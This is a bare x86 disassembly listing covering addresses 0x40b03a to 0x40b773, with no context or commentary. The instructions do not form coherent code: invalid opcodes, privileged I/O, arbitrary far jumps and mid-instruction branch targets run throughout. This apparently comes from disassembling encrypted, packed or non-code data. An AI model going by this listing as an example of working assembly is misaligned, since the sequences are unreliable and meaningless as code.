  40b03a:	aad    0x36
  40b03c:	jo     0x40b008
  40b03e:	mov    ?,WORD PTR [esi+ebx*2]
  40b041:	out    0x8e,eax
  40b043:	mov    edi,0xf3315c9f
  40b048:	push   cs
  40b049:	mov    edx,0x3a19c59
  40b04e:	rcr    BYTE PTR [eax+0x32],0xf
  40b052:	(bad)  
  40b053:	mov    ds:0x47fef4ed,eax
  40b058:	dec    ebp
  40b059:	fwait
  40b05a:	dec    edx
  40b05b:	inc    eax
  40b05c:	inc    ecx
  40b05d:	(bad)  
  40b05e:	dec    al
  40b060:	push   edx
  40b061:	sbb    ah,BYTE PTR [ebp+0x5a64fd28]
  40b067:	push   edx
  40b068:	sbb    al,dh
  40b06a:	(bad)  
  40b06b:	sti    
  40b06c:	lea    edi,[ecx-0x67]
  40b06f:	cmp    ah,0x7
  40b072:	minps  xmm3,XMMWORD PTR [edi+0x16]
  40b076:	cmp    eax,0x5dd8f694
  40b07b:	ins    BYTE PTR es:[edi],dx
  40b07c:	mov    al,0x6e
  40b07e:	call   esi
  40b080:	ds or  ebp,ecx
  40b083:	adc    al,0xae
  40b085:	cdq    
  40b086:	(bad)  
  40b087:	pop    edi
  40b088:	push   ss
  40b089:	sub    DWORD PTR [ebp-0x56],edi
  40b08c:	mov    bl,0xfa
  40b08e:	inc    ecx
  40b08f:	je     0x40b04c
  40b091:	push   0xffffffd8
  40b093:	jmp    0xdcbc:0xf6238892
  40b09a:	(bad)  
  40b09b:	or     eax,0x5e850682
  40b0a0:	stos   BYTE PTR es:[edi],al
  40b0a1:	inc    edi
  40b0a2:	mov    eax,0xdcb7dc2e
  40b0a7:	pop    edx
  40b0a8:	or     BYTE PTR [esi+0x40ae2a3c],bl
  40b0ae:	(bad)  
  40b0af:	jp     0x40b05f
  40b0b1:	push   0xe7463d22
  40b0b6:	test   eax,0xd0ebfce0
  40b0bb:	out    0x25,eax
  40b0bd:	cdq    
  40b0be:	add    DWORD PTR [ebx+eiz*8],ecx
  40b0c1:	iret   
  40b0c2:	cmp    al,0x5a
  40b0c4:	int    0x1a
  40b0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c7:	xor    ch,BYTE PTR [edx]
  40b0c9:	pop    ebp
  40b0ca:	mov    ah,bh
  40b0cc:	mov    eax,0xc3d2e990
  40b0d1:	cli    
  40b0d2:	stc    
  40b0d3:	sbb    ch,ch
  40b0d5:	cmp    al,0xf1
  40b0d7:	inc    ecx
  40b0d8:	inc    ebp
  40b0d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0da:	add    bl,bl
  40b0dc:	(bad)
  40b0e0:	addr16 sub al,0x1b
  40b0e3:	out    dx,eax
  40b0e4:	shr    dh,cl
  40b0e6:	lods   al,BYTE PTR ds:[esi]
  40b0e7:	jg     0x40b07b
  40b0e9:	push   ds
  40b0ea:	pop    edx
  40b0eb:	repz cli 
  40b0ed:	imul   edx,DWORD PTR [ebx+0x1ba1faac],0x1a3de204
  40b0f7:	lahf   
  40b0f8:	or     eax,0xa28ae647
  40b0fd:	sbb    al,0xda
  40b0ff:	scas   eax,DWORD PTR es:[edi]
  40b100:	pop    eax
  40b101:	cwde   
  40b102:	inc    DWORD PTR [ebx]
  40b104:	scas   al,BYTE PTR es:[edi]
  40b105:	dec    edx
  40b106:	sub    eax,0x4a463bb3
  40b10b:	cmp    eax,0x630f0e97
  40b110:	out    0x83,al
  40b112:	loop   0x40b0e5
  40b114:	xor    eax,0xbd0fad24
  40b119:	mov    WORD PTR [ecx+0x7b],?
  40b11c:	dec    ebx
  40b11d:	int3   
  40b11e:	pop    edi
  40b11f:	push   0x3
  40b121:	in     al,0x2e
  40b123:	jmp    FWORD PTR [ebx+0x3385fdf]
  40b129:	outs   dx,BYTE PTR cs:[esi]
  40b12b:	ret    
  40b12c:	lea    eax,[edx+0x58]
  40b12f:	xor    al,0xbd
  40b131:	sbb    DWORD PTR cs:[ebx+0x6b91bad2],esp
  40b138:	sar    DWORD PTR [edx+eiz*8],1
  40b13b:	outs   dx,BYTE PTR ds:[esi]
  40b13c:	mov    ebp,0xb15bf65
  40b141:	scas   eax,DWORD PTR es:[edi]
  40b142:	inc    esp
  40b143:	jg     0x40b120
  40b145:	xor    cl,BYTE PTR [edx+0x98310a3]
  40b14b:	stos   DWORD PTR es:[edi],eax
  40b14c:	outs   dx,DWORD PTR ds:[esi]
  40b14d:	imul   edx,DWORD PTR [edi],0xffffff92
  40b150:	inc    esp
  40b151:	mov    al,ds:0xb53b3b25
  40b156:	add    eax,0x9eb76d2
  40b15b:	jg     0x40b17d
  40b15d:	sbb    dh,BYTE PTR [ebp+0x64f7b6a2]
  40b163:	and    eax,0x5d185b52
  40b168:	adc    eax,0x826a75ce
  40b16d:	cs adc al,0x6c
  40b170:	sbb    ebx,0xfffffff8
  40b173:	enter  0x25bc,0x96
  40b177:	cmp    al,0x5f
  40b179:	out    0xd4,al
  40b17b:	hlt    
  40b17c:	into   
  40b17d:	mov    esi,0x449480a9
  40b182:	jbe    0x40b1a3
  40b184:	dec    edi
  40b185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b186:	xor    bh,BYTE PTR [ebx+edi*4]
  40b189:	icebp  
  40b18a:	(bad)  
  40b18b:	dec    ebx
  40b18c:	out    dx,eax
  40b18d:	(bad)  
  40b18f:	retf   
  40b190:	pop    ecx
  40b191:	mov    DWORD PTR [edi+edx*1],0xb820b0f1
  40b198:	repz rcl BYTE PTR [esp+edi*4-0x42d9df50],1
  40b1a0:	fs loop 0x40b195
  40b1a3:	cs push edx
  40b1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a6:	(bad)  
  40b1a7:	jecxz  0x40b21c
  40b1a9:	mov    bh,0xfd
  40b1ab:	sahf   
  40b1ac:	xchg   edx,eax
  40b1ad:	push   ebp
  40b1ae:	stc    
  40b1af:	sbb    eax,0xb87f27ae
  40b1b4:	iret   
  40b1b5:	rcl    DWORD PTR [eax-0x32],1
  40b1b8:	sub    al,0x3b
  40b1ba:	jo     0x40b1d6
  40b1bc:	dec    eax
  40b1bd:	sbb    bl,BYTE PTR [ebx+0x60]
  40b1c0:	add    BYTE PTR [edi],ah
  40b1c2:	rcl    edx,cl
  40b1c4:	mov    al,bh
  40b1c6:	sbb    BYTE PTR [edx+0x3fe8a770],dh
  40b1cc:	adc    al,0xa3
  40b1ce:	mov    bh,0x90
  40b1d0:	or     BYTE PTR [ecx+0xd1b8b19],dh
  40b1d6:	(bad)  
  40b1d8:	pop    edx
  40b1d9:	inc    ecx
  40b1da:	mov    eax,ds:0xf670aa7
  40b1df:	test   al,0x11
  40b1e1:	xchg   esp,eax
  40b1e2:	or     al,0xac
  40b1e4:	xchg   DWORD PTR [ecx+0x5f],edi
  40b1e7:	xor    BYTE PTR ds:0x202368c7,bh
  40b1ed:	dec    edx
  40b1ee:	mov    al,ds:0x8de91c72
  40b1f3:	sti    
  40b1f4:	(bad)  
  40b1f5:	aam    0xce
  40b1f7:	jne    0x40b255
  40b1f9:	xchg   esi,eax
  40b1fa:	inc    edi
  40b1fb:	test   eax,0x56a9da3d
  40b200:	outs   dx,DWORD PTR ds:[esi]
  40b201:	adc    DWORD PTR [ecx-0x4674baed],ebx
  40b207:	jl     0x40b285
  40b209:	xor    cl,BYTE PTR [ebx-0x50]
  40b20c:	cmp    eax,0x6199d35
  40b211:	push   edx
  40b212:	push   cs
  40b213:	push   ebp
  40b214:	daa    
  40b215:	ins    DWORD PTR es:[edi],dx
  40b216:	fnstsw WORD PTR [edx+0x47]
  40b219:	outs   dx,DWORD PTR ds:[esi]
  40b21a:	fistp  QWORD PTR [eax]
  40b21c:	nop
  40b21d:	dec    esp
  40b21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b21f:	out    dx,al
  40b220:	and    bl,BYTE PTR [ebx+edi*2-0x34]
  40b224:	enter  0xa6d5,0xaa
  40b228:	push   edx
  40b229:	call   0xbb1d:0x9aaac30f
  40b230:	sub    DWORD PTR [ecx-0x1d],ebp
  40b233:	les    esi,FWORD PTR [edi]
  40b235:	mov    bh,BYTE PTR [esi]
  40b237:	(bad)  
  40b238:	aam    0xb1
  40b23a:	mov    dh,0x4d
  40b23c:	sbb    ecx,ebx
  40b23e:	out    0x20,eax
  40b240:	jnp    0x40b2aa
  40b242:	pushf  
  40b243:	(bad)  
  40b244:	push   esp
  40b245:	cli    
  40b246:	mov    ah,cl
  40b248:	cwde   
  40b249:	xchg   DWORD PTR [ecx],ebx
  40b24b:	out    0x8b,eax
  40b24d:	sbb    eax,0xb9082e8
  40b252:	retf   0xffe7
  40b255:	xor    BYTE PTR es:[ecx+0x19905],dh
  40b25c:	lahf   
  40b25d:	cmp    al,0x5c
  40b25f:	lahf   
  40b260:	into   
  40b261:	mov    esp,0xc5c6167a
  40b266:	sbb    al,0x13
  40b268:	adc    dh,dh
  40b26a:	je     0x40b258
  40b26c:	out    0xd4,eax
  40b26e:	rol    DWORD PTR [ebx+0x29],1
  40b271:	xor    BYTE PTR [ebp+edx*8+0x3bf8df15],bh
  40b278:	adc    eax,0xb56b9808
  40b27d:	jne    0x40b282
  40b27f:	push   ebp
  40b280:	pop    esi
  40b281:	(bad)  
  40b282:	sbb    ecx,DWORD PTR [edx-0x1f]
  40b285:	call   0x2daf:0x3bbef065
  40b28c:	in     eax,0x1a
  40b28e:	and    eax,0xa6cab410
  40b293:	inc    ebp
  40b294:	adc    ebx,ebx
  40b296:	mov    esp,0xbbbc785f
  40b29b:	xchg   ebx,eax
  40b29c:	jns    0x40b269
  40b29e:	(bad)  
  40b29f:	fistp  QWORD PTR ds:0xd208cddf
  40b2a5:	rcr    BYTE PTR [edi-0x5dcbaf84],cl
  40b2ab:	std    
  40b2ac:	mov    ds:0x13b844eb,eax
  40b2b1:	and    al,0x43
  40b2b3:	imul   ebp,DWORD PTR [esi],0x24abc768
  40b2b9:	add    esi,DWORD PTR ds:[ebp+0x5c]
  40b2bd:	cmp    eax,0x3aca703f
  40b2c2:	or     DWORD PTR [edx-0x7df84fd6],esi
  40b2c8:	adc    al,0x6b
  40b2ca:	fmul   DWORD PTR [eax+esi*8]
  40b2cd:	push   eax
  40b2ce:	sbb    al,0x55
  40b2d0:	mov    eax,0x88c856d1
  40b2d5:	hlt    
  40b2d6:	adc    BYTE PTR [ecx+0x70],0x9e
  40b2da:	cwde   
  40b2db:	lock fimul DWORD PTR [ecx-0x6d]
  40b2df:	push   ebx
  40b2e0:	je     0x40b2f5
  40b2e2:	jmp    FWORD PTR [esi+0x768ce6fb]
  40b2e8:	pop    ebx
  40b2e9:	leave  
  40b2ea:	(bad)  
  40b2eb:	cli    
  40b2ec:	shr    DWORD PTR [eax-0x8],cl
  40b2ef:	sahf   
  40b2f0:	push   esp
  40b2f1:	retf   
  40b2f2:	jmp    0x9e1f7f9d
  40b2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f8:	or     al,0xf3
  40b2fa:	mov    ds:0x8a8d371c,al
  40b2ff:	add    BYTE PTR [esi],dh
  40b301:	dec    ebp
  40b302:	jae    0x40b336
  40b304:	out    0xc6,al
  40b306:	add    BYTE PTR ds:0xa3538b25,dh
  40b30c:	push   ss
  40b30d:	or     edi,DWORD PTR [ebx]
  40b30f:	ror    BYTE PTR [eax+0x56],0xfc
  40b313:	pop    ebp
  40b314:	dec    dl
  40b316:	jnp    0x40b33a
  40b318:	stos   DWORD PTR es:[edi],eax
  40b319:	aas    
  40b31a:	xchg   edx,eax
  40b31b:	sub    ch,BYTE PTR [edi-0x3e]
  40b31e:	inc    ebp
  40b31f:	mov    ah,0xcb
  40b321:	cdq    
  40b322:	sti    
  40b323:	enter  0xc639,0xd6
  40b327:	or     esp,DWORD PTR [eax-0x29]
  40b32a:	sub    edx,ecx
  40b32c:	mov    edx,0xb7627444
  40b331:	mov    ah,0x64
  40b333:	add    al,0xad
  40b335:	aaa    
  40b336:	imul   eax,DWORD PTR [bx+di+0x2d28],0x51
  40b33c:	add    al,0xed
  40b33e:	inc    esp
  40b33f:	lods   al,BYTE PTR ss:[esi]
  40b341:	cmp    dh,BYTE PTR [ecx-0x7bcc1633]
  40b347:	clc    
  40b348:	dec    ecx
  40b349:	add    BYTE PTR [ebp-0x705b0376],bh
  40b34f:	mov    ch,0xfd
  40b351:	cmp    al,0x40
  40b353:	cmp    ebp,DWORD PTR [eax+0x7f]
  40b356:	jmp    0xa15f:0xb04eeecd
  40b35d:	aaa    
  40b35e:	mov    eax,0x5ab95f2e
  40b363:	fwait
  40b364:	or     DWORD PTR [edx+0x65ef38fc],esp
  40b36a:	lea    ebx,[esi+0xb7ce9f6]
  40b370:	mov    cl,0xb0
  40b372:	jmp    0x40b308
  40b374:	jmp    0x40b3c2
  40b376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b377:	sbb    edx,DWORD PTR [edx+edi*8]
  40b37a:	sahf   
  40b37b:	jmp    0x40b340
  40b37d:	inc    esi
  40b37e:	sub    eax,0x772f6816
  40b383:	hlt    
  40b384:	out    0x11,al
  40b386:	out    dx,eax
  40b387:	iret   
  40b388:	sar    eax,0x7a
  40b38b:	sbb    ecx,DWORD PTR [ebx-0x14]
  40b38e:	cwde   
  40b38f:	mov    ah,0x57
  40b391:	and    eax,DWORD PTR [edx-0x235db7ef]
  40b397:	stos   BYTE PTR es:[edi],al
  40b398:	test   BYTE PTR [ebp-0x2023ab8b],dh
  40b39e:	ret    0x23b8
  40b3a1:	stos   BYTE PTR es:[edi],al
  40b3a2:	pop    eax
  40b3a3:	nop
  40b3a4:	pop    esp
  40b3a5:	pop    esi
  40b3a6:	das    
  40b3a7:	out    0x32,eax
  40b3a9:	(bad)  
  40b3ab:	leave  
  40b3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3ad:	sar    al,cl
  40b3af:	or     al,0xb9
  40b3b1:	not    DWORD PTR [eax-0x4d]
  40b3b4:	cmc    
  40b3b5:	dec    esp
  40b3b6:	or     DWORD PTR [edi],ebx
  40b3b8:	cmp    DWORD PTR [edi],esi
  40b3ba:	cdq    
  40b3bb:	arpl   WORD PTR [edx+0x3f8a4683],bx
  40b3c1:	mov    BYTE PTR [ebx],ch
  40b3c3:	in     eax,dx
  40b3c4:	fsubr  st,st(6)
  40b3c6:	pop    esp
  40b3c7:	(bad)  
  40b3c8:	sub    al,0x6f
  40b3ca:	cmp    al,0x3d
  40b3cc:	jbe    0x40b3de
  40b3ce:	push   ss
  40b3cf:	pop    eax
  40b3d0:	ret    
  40b3d1:	dec    edi
  40b3d2:	and    edx,ecx
  40b3d4:	push   esi
  40b3d5:	(bad)  
  40b3d6:	fsub   st(7),st
  40b3d8:	and    BYTE PTR [eax],bl
  40b3da:	std    
  40b3db:	or     BYTE PTR [esi+0x29],ah
  40b3de:	inc    edi
  40b3df:	mov    WORD PTR [ebx],fs
  40b3e1:	arpl   WORD PTR [esi],bx
  40b3e3:	daa    
  40b3e4:	mov    esi,0x8a5b2c7d
  40b3e9:	lods   al,BYTE PTR ds:[esi]
  40b3ea:	and    BYTE PTR [ecx],dl
  40b3ec:	cmp    eax,0x3766b206
  40b3f1:	inc    eax
  40b3f2:	je     0x40b404
  40b3f4:	push   0xffffff84
  40b3f6:	jp     0x40b416
  40b3f8:	es inc ecx
  40b3fa:	ss (bad) 
  40b3fc:	repz inc eax
  40b3fe:	icebp  
  40b3ff:	jg     0x40b45a
  40b401:	sub    BYTE PTR [edi-0x6e],bl
  40b404:	xlat   BYTE PTR ds:[ebx]
  40b405:	lahf   
  40b406:	xor    BYTE PTR [esi+eax*2+0x61],al
  40b40a:	pop    eax
  40b40b:	adc    BYTE PTR [edi+edi*1-0x550d0684],0xa8
  40b413:	fistp  QWORD PTR [edi+0x5a77fb87]
  40b419:	scas   al,BYTE PTR es:[edi]
  40b41a:	in     eax,dx
  40b41b:	ins    DWORD PTR es:[edi],dx
  40b41c:	or     BYTE PTR [edx],ch
  40b41e:	push   ebx
  40b41f:	loop   0x40b3dd
  40b421:	push   DWORD PTR [edx-0xd7fd50d]
  40b427:	scas   eax,DWORD PTR es:[edi]
  40b428:	push   edi
  40b429:	popa   
  40b42a:	pop    ebx
  40b42b:	out    0x47,al
  40b42d:	scas   al,BYTE PTR es:[edi]
  40b42e:	and    bh,BYTE PTR [edi-0x20c4a5c8]
  40b434:	push   esi
  40b435:	rol    BYTE PTR [edi+0x62],cl
  40b438:	ds push edx
  40b43a:	clc    
  40b43b:	int3   
  40b43c:	lods   eax,DWORD PTR ds:[esi]
  40b43d:	mov    bl,0xed
  40b43f:	stc    
  40b440:	js     0x40b3ea
  40b442:	cli    
  40b443:	loope  0x40b4be
  40b445:	jle    0x40b46b
  40b447:	pop    edx
  40b448:	push   ds
  40b449:	cwde   
  40b44a:	sbb    DWORD PTR [edi-0x5e65985a],edx
  40b450:	retf   0xc5a9
  40b453:	scas   al,BYTE PTR es:[edi]
  40b454:	iret   
  40b455:	sti    
  40b456:	cmp    al,0x3
  40b458:	sbb    edi,eax
  40b45a:	mov    bl,0x2d
  40b45c:	xor    ebx,edi
  40b45e:	repnz es std 
  40b461:	imul   esp,DWORD PTR [eax+0x22037b76],0x73
  40b468:	aaa    
  40b469:	or     ebx,ebx
  40b46b:	inc    ebx
  40b46c:	scas   al,BYTE PTR es:[edi]
  40b46d:	xchg   esi,eax
  40b46e:	retf   
  40b46f:	pop    eax
  40b470:	mov    BYTE PTR [ecx-0x59],dl
  40b473:	or     al,0x3
  40b475:	nop
  40b476:	push   ds
  40b477:	push   ds
  40b478:	jb     0x40b4c4
  40b47a:	lds    esi,FWORD PTR [ebx]
  40b47c:	int3   
  40b47d:	test   ah,0xbb
  40b480:	enter  0x6481,0xe9
  40b484:	adc    al,0x20
  40b486:	mov    dl,0xf2
  40b488:	imul   ebx,DWORD PTR ds:0x954227a1,0x84dc7834
  40b492:	mov    esi,0x914b7d48
  40b497:	jecxz  0x40b45d
  40b499:	je     0x40b442
  40b49b:	ja     0x40b517
  40b49d:	inc    eax
  40b49e:	mov    ch,0xf
  40b4a0:	sbb    DWORD PTR [eax-0x15],ecx
  40b4a3:	push   0xffffff88
  40b4a5:	pop    ebp
  40b4a6:	xchg   edx,eax
  40b4a7:	test   al,0x66
  40b4a9:	jmp    DWORD PTR [esi-0x75]
  40b4ac:	icebp  
  40b4ad:	sbb    al,0xd6
  40b4af:	jecxz  0x40b507
  40b4b1:	mov    edi,0x6eb44401
  40b4b6:	jnp    0x40b482
  40b4b8:	push   esp
  40b4b9:	imul   eax,ebp,0x50e81db3
  40b4bf:	dec    edi
  40b4c0:	test   DWORD PTR [ebp-0x3927dd24],esi
  40b4c6:	pushf  
  40b4c7:	imul   ecx,DWORD PTR [esi-0x19],0x8ce677eb
  40b4ce:	push   ebp
  40b4cf:	add    bh,BYTE PTR [ebx+0x16]
  40b4d2:	push   edi
  40b4d3:	inc    ebx
  40b4d4:	jno    0x40b473
  40b4d6:	sub    al,0x98
  40b4d8:	aaa    
  40b4d9:	dec    ecx
  40b4da:	push   0x2f
  40b4dc:	int3   
  40b4dd:	mov    ah,0xee
  40b4df:	in     al,0xbe
  40b4e1:	mov    ds:0xdee96f15,eax
  40b4e6:	xchg   esi,eax
  40b4e7:	in     eax,dx
  40b4e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4e9:	xchg   edx,eax
  40b4ea:	pusha  
  40b4eb:	in     eax,dx
  40b4ec:	sahf   
  40b4ed:	rol    BYTE PTR [ebp+0x1d1b2ea1],1
  40b4f3:	cmp    eax,0x34cf8206
  40b4f8:	leave  
  40b4f9:	mov    eax,0xe7aa5b68
  40b4fe:	rcr    BYTE PTR [esi-0x17],1
  40b501:	fsubr  QWORD PTR [eax-0xe6272f4]
  40b507:	push   edi
  40b508:	es std 
  40b50a:	push   ebp
  40b50b:	dec    esi
  40b50c:	sub    ebp,DWORD PTR [esi]
  40b50e:	out    0x5a,al
  40b510:	mov    ebx,0x5574fc09
  40b515:	xchg   BYTE PTR [esi+0xdf9051d],dl
  40b51b:	loop   0x40b562
  40b51d:	xlat   BYTE PTR ds:[ebx]
  40b51e:	push   0xf979cdbf
  40b523:	retf   
  40b524:	in     al,0x8
  40b526:	add    eax,0xc2f63a4a
  40b52b:	aas    
  40b52c:	xlat   BYTE PTR ds:[ebx]
  40b52d:	int3   
  40b52e:	dec    eax
  40b52f:	push   ds
  40b530:	into   
  40b531:	xchg   ah,cl
  40b533:	and    eax,0x81d47cf3
  40b538:	icebp  
  40b539:	sbb    al,ah
  40b53b:	xchg   ebx,eax
  40b53c:	(bad)  
  40b53d:	call   0xd38a89ef
  40b542:	loope  0x40b562
  40b544:	jmp    DWORD PTR [esi+ebp*8]
  40b547:	jno    0x40b562
  40b549:	(bad)  
  40b54a:	push   cs
  40b54b:	jo     0x40b52f
  40b54d:	dec    edi
  40b54e:	or     DWORD PTR [edx-0x712a2b84],edx
  40b554:	sub    esp,DWORD PTR [esp+esi*8+0x48ad563b]
  40b55b:	loope  0x40b514
  40b55d:	mov    al,0x56
  40b55f:	or     ebp,DWORD PTR [ecx+eiz*4+0x25]
  40b563:	popf   
  40b564:	cmp    al,0x4b
  40b566:	jecxz  0x40b55c
  40b568:	aad    0x94
  40b56a:	adc    BYTE PTR [edi-0x68],cl
  40b56d:	pop    es
  40b56e:	(bad)  
  40b56f:	mov    ecx,0xf83d8133
  40b574:	mov    ah,0x78
  40b576:	add    bh,BYTE PTR [eax+0x5bcb9b45]
  40b57c:	cwde   
  40b57d:	stos   BYTE PTR es:[edi],al
  40b57e:	syscall 
  40b580:	push   es
  40b581:	mov    ebx,0x1f9cc7f8
  40b586:	int    0xba
  40b588:	jmp    0x40b604
  40b58a:	push   ss
  40b58b:	out    dx,eax
  40b58c:	adc    ebp,ecx
  40b58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b58f:	push   0xffffffa4
  40b591:	inc    ebx
  40b592:	mov    DWORD PTR [ebp-0x160c64fb],edx
  40b598:	and    al,0x6d
  40b59a:	cmp    esp,DWORD PTR [edx-0x73]
  40b59d:	das    
  40b59e:	sbb    DWORD PTR [ebp-0x35],0xb296fda0
  40b5a5:	test   ch,ch
  40b5a7:	dec    esp
  40b5a8:	in     al,0x75
  40b5aa:	ja     0x40b5e0
  40b5ac:	es push ss
  40b5ae:	or     edi,DWORD PTR [edx-0x1]
  40b5b1:	pop    eax
  40b5b2:	clc    
  40b5b3:	sar    DWORD PTR [eax],1
  40b5b5:	(bad)  
  40b5b6:	push   esp
  40b5b7:	stc    
  40b5b8:	push   ebx
  40b5b9:	mov    bh,0x11
  40b5bb:	mov    ecx,0xf43b34af
  40b5c0:	and    DWORD PTR [edi],ecx
  40b5c2:	test   bh,bh
  40b5c4:	(bad)  
  40b5c5:	pushf  
  40b5c6:	push   es
  40b5c7:	addr16 loopne 0x40b61a
  40b5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5cb:	mov    ss,eax
  40b5cd:	out    dx,eax
  40b5ce:	jae    0x40b56d
  40b5d0:	cmp    DWORD PTR [esi],eax
  40b5d2:	push   es
  40b5d3:	xor    ebx,eax
  40b5d5:	push   0x325f70e6
  40b5da:	ja     0x40b606
  40b5dc:	call   0x9a7c:0x68647dbc
  40b5e3:	xchg   ebp,eax
  40b5e4:	inc    esi
  40b5e5:	sar    DWORD PTR [edx+0x5e0f0b76],1
  40b5eb:	aas    
  40b5ec:	jg     0x40b64a
  40b5ee:	stos   BYTE PTR es:[edi],al
  40b5ef:	(bad)  
  40b5f0:	mov    ds:0x9b747ac9,al
  40b5f5:	(bad)  
  40b5f6:	xchg   ebx,eax
  40b5f7:	les    ecx,FWORD PTR [edi+0x6f80de43]
  40b5fd:	inc    ebp
  40b5fe:	sbb    cl,dl
  40b600:	sbb    BYTE PTR [ecx-0x5c],ch
  40b603:	(bad)  
  40b604:	nop
  40b605:	jns    0x7f7a50d5
  40b60b:	mov    ch,0x5d
  40b60d:	ret    0xdc3d
  40b610:	ror    DWORD PTR [edx-0xd523f1c],cl
  40b616:	loopne 0x40b61e
  40b618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b619:	rol    ch,1
  40b61b:	adc    al,0xcc
  40b61d:	(bad)  [edi+0x939b6f3]
  40b623:	mov    ebp,0x67adb5e4
  40b628:	push   esi
  40b629:	add    DWORD PTR [esi-0x42c8f348],edx
  40b62f:	mov    ecx,0x58367c3a
  40b634:	lea    esp,[ecx]
  40b636:	jg     0x40b68b
  40b638:	call   0xaa26:0x9e0735de
  40b63f:	call   0x2674:0x8bd9
  40b645:	clc    
  40b646:	push   edx
  40b647:	gs inc edi
  40b649:	js     0x40b6b4
  40b64b:	lods   eax,DWORD PTR ds:[esi]
  40b64c:	mov    ebp,0xd4197409
  40b651:	mov    bl,0xfe
  40b653:	sub    bh,BYTE PTR [ebx+0x19]
  40b656:	lods   al,BYTE PTR ds:[esi]
  40b657:	test   al,0xd8
  40b659:	aad    0x8
  40b65b:	sbb    al,bl
  40b65d:	int    0xd6
  40b65f:	retf   
  40b660:	lahf   
  40b661:	jmp    0x40b676
  40b663:	mov    esp,edi
  40b665:	dec    eax
  40b666:	rol    al,1
  40b668:	push   ds
  40b669:	pop    eax
  40b66a:	jnp    0x40b646
  40b66c:	rcl    BYTE PTR [esi],cl
  40b66e:	adc    DWORD PTR [edi+ecx*1],0xb9eedaa0
  40b675:	(bad)
  40b679:	add    ebx,DWORD PTR ds:0x800cafe7
  40b67f:	mov    al,ds:0xc0d2eea7
  40b684:	fwait
  40b685:	dec    esi
  40b686:	push   esi
  40b687:	ss dec edi
  40b689:	mov    esi,0x82e6e1cc
  40b68e:	push   esp
  40b68f:	mov    esp,0x798ac8fc
  40b694:	inc    ebp
  40b695:	(bad)  
  40b696:	pop    eax
  40b697:	mov    al,fs:0x80a9c0ee
  40b69d:	cmp    ah,BYTE PTR [esi]
  40b69f:	pop    ss
  40b6a0:	adc    dl,dh
  40b6a2:	and    DWORD PTR [edx-0x76ce4adc],esp
  40b6a8:	xlat   BYTE PTR ds:[ebx]
  40b6a9:	pop    eax
  40b6aa:	mov    ds:0xc9bb707f,eax
  40b6af:	mov    edi,0x6f83fe37
  40b6b4:	aad    0xd6
  40b6b6:	push   esi
  40b6b7:	aas    
  40b6b8:	inc    edi
  40b6b9:	mov    ah,0x17
  40b6bb:	leave  
  40b6bc:	pop    ecx
  40b6bd:	call   0x6136b0af
  40b6c2:	rcr    BYTE PTR [ebp+eax*1+0x64],1
  40b6c6:	mov    ecx,0xb364c3de
  40b6cb:	pop    esi
  40b6cc:	and    BYTE PTR [eax-0x5d],dh
  40b6cf:	jno    0x40b6b3
  40b6d1:	add    eax,DWORD PTR [esi+0x5c278e0c]
  40b6d7:	js     0x40b6df
  40b6d9:	cs push ebp
  40b6db:	pop    edi
  40b6dc:	jge    0x40b693
  40b6de:	sub    al,0x24
  40b6e0:	sub    esi,DWORD PTR [edi+0x3]
  40b6e3:	dec    ebx
  40b6e4:	lds    ebx,FWORD PTR gs:[edx]
  40b6e7:	scas   al,BYTE PTR es:[edi]
  40b6e8:	mov    cl,BYTE PTR [ecx]
  40b6ea:	xchg   edi,eax
  40b6eb:	out    dx,eax
  40b6ec:	sti    
  40b6ed:	or     al,0xac
  40b6ef:	js     0x40b6b8
  40b6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f2:	neg    BYTE PTR [ecx]
  40b6f4:	or     ebx,DWORD PTR [esi+ebp*1]
  40b6f7:	pop    ebx
  40b6f8:	mov    ds:0x49670be9,eax
  40b6fd:	add    edi,DWORD PTR [eax]
  40b6ff:	fcmovnbe st,st(3)
  40b701:	jnp    0x40b6ca
  40b703:	enter  0x2ac3,0x2
  40b707:	add    BYTE PTR [ecx-0x36fa469a],ah
  40b70d:	pop    esi
  40b70e:	push   ss
  40b70f:	adc    esi,DWORD PTR [ebx]
  40b711:	std    
  40b712:	out    dx,eax
  40b713:	fcomp  QWORD PTR [edx]
  40b716:	lods   al,BYTE PTR ds:[esi]
  40b717:	sub    al,0x2b
  40b719:	jmp    0x7701:0xde2c611b
  40b720:	inc    ecx
  40b721:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40b723:	xchg   ecx,eax
  40b724:	xchg   ebp,eax
  40b725:	add    BYTE PTR [edi+0x70],bh
  40b728:	mov    dl,cl
  40b72a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b72b:	setnp  BYTE PTR [esi-0x6b]
  40b72f:	scas   al,BYTE PTR es:[edi]
  40b730:	adc    esp,esi
  40b732:	mov    BYTE PTR [ebp-0x2989a4f7],bh
  40b738:	imul   ebp,ebp,0xffffffbc
  40b73b:	fistp  WORD PTR [esi-0x59]
  40b73e:	fistp  QWORD PTR [eax-0x49e6995f]
  40b744:	sbb    eax,ebp
  40b746:	inc    edx
  40b747:	cli    
  40b748:	sub    eax,0x9b555fa4
  40b74d:	inc    edx
  40b74e:	inc    esp
  40b74f:	push   esp
  40b750:	shl    DWORD PTR [ebx],0x4d
  40b753:	mov    dh,0xfe
  40b755:	inc    edx
  40b756:	repz in eax,0x9
  40b759:	mov    ebx,0x8b0d35d4
  40b75e:	or     al,0x3a
  40b760:	mov    ebx,0x630a6c4a
  40b765:	push   edx
  40b766:	xor    BYTE PTR [esi-0x77],0x7c
  40b76a:	xor    edx,esp
  40b76c:	and    DWORD PTR [ebx+0x23],ecx
  40b76f:	outs   dx,DWORD PTR ds:[esi]
  40b770:	sti    
  40b771:	push   DWORD PTR [eax]
  40b773:	and    al,0x24
